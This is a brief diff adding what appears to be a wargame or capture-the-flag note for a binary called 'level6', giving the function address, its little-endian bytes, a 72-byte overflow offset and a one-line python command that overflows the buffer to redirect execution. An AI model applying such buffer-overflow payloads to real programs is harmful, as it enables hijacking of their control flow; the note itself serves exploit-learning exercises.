@@ -1,0 +1,7 @@
+we want to put the address of the n function into the stack with a buffer overflow
+
+08048454 address of n
+\x54\x84\x04\x08
+
+we overflow at 72 bytes
+./level6 $(python -c 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x54\x84\x04\x08"')
